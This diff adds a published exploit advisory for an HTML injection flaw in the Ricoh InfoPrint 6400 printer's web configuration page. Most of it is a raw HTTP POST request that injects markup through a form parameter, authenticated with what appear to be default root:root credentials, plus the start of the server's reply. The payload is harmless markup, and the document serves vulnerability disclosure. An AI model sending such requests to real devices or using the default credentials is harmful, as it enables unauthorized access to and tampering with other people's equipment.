@@ -1,0 +1,37 @@
+# Exploit Title: IBM RICOH 6400 Printer - HTML Injection
+# Date: 2020-01-02 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.ibm.com/il-en
+# Hardware Link: https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?infotype=AN&subtype=CA&htmlfid=649/ENUSA02-1405&appname=USN
+# Firmware Version: 1.1.26.3
+# Vulernability Type: Code Injection
+# Vulenrability: HTML Injection
+# CVE: N/A
+
+# Description :
+# Ricoh InfoPrint 6400 devices allow /config?logpathConf.html
+# HTML Injection by authenticated users, as demonstrated by the 420 parameter.
+
+HTTP Request :
+
+POST /config?logpathConf.html HTTP/1.1
+Host: SERVER
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Origin: SERVER
+Authorization: Basic cm9vdDpyb290
+Connection: close
+Referer: http://SERVER/config?logpathConf.html
+Upgrade-Insecure-Requests: 1
+
+428=&420=%22%3E%3Cmarquee%3EIsmail+Tasdelen&548=5&564=
+
+HTTP Response :
+
+HTTP/1.0 200 OK
+Server: Microplex emHTTPD/1.0
+Content-Type: text/html
